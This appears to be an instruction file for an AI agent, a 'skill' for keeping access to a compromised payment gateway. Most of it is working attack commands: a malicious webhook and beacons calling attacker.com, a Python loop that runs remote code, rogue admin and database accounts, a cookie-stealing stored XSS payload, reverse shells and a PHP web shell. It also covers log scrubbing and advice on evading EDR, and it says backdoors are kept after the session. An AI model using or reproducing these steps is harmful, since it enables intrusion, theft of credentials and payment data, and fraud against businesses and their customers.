# SKILL: persistence-ops

## Identity
- **Name:** persistence-ops
- **Category:** Access Maintenance
- **Trigger:** After gaining initial access to a payment gateway target; to establish ongoing access for operational continuity
- **Confidence requirement:** 8/10

## Overview

Persistence is about maintaining access between sessions. After a successful engagement phase, the goal is to leave mechanisms that allow re-entry without needing to re-exploit. All persistence must be documented, reversible where possible, and cleaned up as per the end-of-engagement protocol.

**Never establish persistence without Operator approval.** Document every persistence mechanism in the engagement log.

## Operational Procedure

### Step 1: Webhook Backdoor

Most payment gateways have webhook endpoints. Adding a malicious callback URL is high-value and low-detectable:

```bash
# Identify webhook endpoint
curl -s https://target.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" | jq '.[].callback_url'

# Add malicious webhook
curl -s -X POST https://target.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "event": "payment.completed",
    "callback_url": "https://attacker-controlled.com/callback",
    "secret": "test123"
  }'

# Verify callback fires
python3 -m http.server 8080  # on attacker box
# Wait for callback on target payment

# Use for: periodic recon callbacks, data exfiltration, tracking
```

### Step 2: Admin Account Creation

```bash
# Register new admin account
curl -s -X POST https://target.com/api/admin/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "support@legitimate-domain.com",
    "password": "P@ssw0rd123!",
    "role": "admin"
  }'

# Elevate existing low-privilege account
curl -s -X PUT https://target.com/api/admin/users/$USER_ID \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "super_admin"}'

# Verify access
curl -s https://target.com/api/admin/dashboard \
  -H "Authorization: Bearer $NEW_TOKEN"
```

### Step 3: Cron-Based Callback

Schedule periodic callbacks to attacker infrastructure for ongoing intelligence:

```bash
# Linux cron (if shell access gained)
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s https://attacker.com/recon/$(hostname)/$(date +%s)") | crontab -

# Or write to crontab directly
echo "*/5 * * * * /usr/bin/curl -s https://attacker.com/beacon/$(hostname)" >> /var/spool/cron/root

# Python-based callback (more flexible)
cat > /tmp/beacon.py << 'EOF'
#!/usr/bin/env python3
import requests, socket, os, datetime
while True:
    try:
        r = requests.get(f"https://attacker.com/beacon/{socket.gethostname()}/{os.getpid()}", timeout=5)
        if r.text:
            exec(r.text)
    except:
        pass
    import time; time.sleep(300)
EOF

python3 /tmp/beacon.py &
```

### Step 4: API Key Generation

Generate a service account API key for programmatic access:

```bash
# Create API key via admin panel
curl -s -X POST https://target.com/api/keys \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Integration Service",
    "scopes": ["read:transactions", "write:refunds"],
    "expires": null
  }'

# Store key securely
echo "KEY_ID=xxx KEY_SECRET=yyy" >> ~/.credentials
chmod 600 ~/.credentials

# Verify programmatic access
curl -s https://target.com/api/transactions \
  -H "Authorization: Bearer $KEY_SECRET"
```

### Step 5: Database Backdoor

```bash
# If database access gained (SQL injection or credentials)
# Add backdoor admin user

# PostgreSQL
psql -h target-db.internal -U postgres -d payment_db << 'EOF'
INSERT INTO users (email, password_hash, role, created_at)
VALUES ('backdoor@system.local', 'hash_here', 'super_admin', NOW());
EOF

# MySQL
mysql -h target-db.internal -u app -p << 'EOF'
INSERT INTO admins (username, password, access_level)
VALUES ('svc_monitor', SHA2('P@ssw0rd', 256), 3);
EOF

# Add stored XSS for persistent session hijacking
sqlmap --sql-query "UPDATE users SET address='<script>fetch(\"attacker.com/steal?c=\"+document.cookie)</script>' WHERE email='attacker@controlled.com'"
```

### Step 6: Reverse Shell

```bash
# Python reverse shell
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("attacker.com",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

# PHP shell (web root access)
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# Node.js shell (if Node is on server)
const net = require("net"), spawn = require("child_process").spawn, sh = spawn("/bin/sh", []);
const client = new net.Socket(); client.connect(443, "attacker.com", () => { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });

# Netcat (if available)
nc -e /bin/sh attacker.com 443

# One-liner persistence check
curl -s https://target.com/shell.php?cmd=whoami
```

### Step 7: SSL Certificate Backdoor

```bash
# Generate legitimate-looking SSL cert for backdoor domain
# Use real CA (Let's Encrypt) for trust
certbot certonly --nginx -d target-backend-api.com -d target-payments.com

# Install cert for MITM capability
# Only use on authorized internal testing
echo "SSL backdoor: install attacker-controlled cert on internal proxy"

# Check for existing SSL pinning that could be bypassed
python3 neopay/scripts/crypto_downgrade.py --target target.com --check-pinning
```

### Step 8: Cleanup Protocol

Before ending session, clean up only if safe to do so:

```bash
# Remove only YOUR artifacts (don't touch legitimate activity)
rm /tmp/beacon.py 2>/dev/null
rm /tmp/payload.sh 2>/dev/null

# Sanitize logs
# Remove your IP from access logs if possible
echo "Log sanitization: check if write access to logs"

# Keep persistence mechanisms — report to Elkin for continuity
echo "Persistence established: document in knowledge/gateway_profiles/<target>/persistence_log.json"
```

## Persistence Methods Reference

| Method | Stealth | Reliability | Detection Risk |
|---|---|---|---|
| Webhook backdoor | High | Medium | Low — looks like legitimate integration |
| Admin account | Medium | High | Medium — admin panel audit |
| Cron callback | Medium | High | Low — scheduled task blends in |
| API key | High | High | Low — API keys are normal |
| DB backdoor | Medium | High | High — DB audit logs |
| Reverse shell | Low | Medium | High — EDR/NIDS |
| SSL backdoor | High | Medium | Low — SSL is normal |

## Output

Persistence mechanisms documented in:
- `knowledge/gateway_profiles/<target>/persistence_log.json`
- `knowledge/gateway_profiles/<target>/persistence_log.md`

Include: type, location, trigger condition, verification status, cleanup procedure.

## Cross-References

- `bot_persistence.md` — full persistence guide
- `OPSEC.md` — sanitization rules
- `EVIDENCE_CHAIN.md` — evidence preservation before cleanup
- `pipeline-runner` — integrate into engagement pipeline

## Troubleshooting

| Problem | Solution |
|---|---|
| Webhook blocked | Check if callback URL is reachable from target network |
| Admin registration forbidden | Role requires approval — try social engineering or DB insert |
| Cron not executing | Check cron daemon running, check PATH, verify script permissions |
| Shell caught by EDR | Use refined shellcode, go encrypted, blend with legitimate traffic |
| Cleanup removes legitimate files | Always check file ownership before deletion |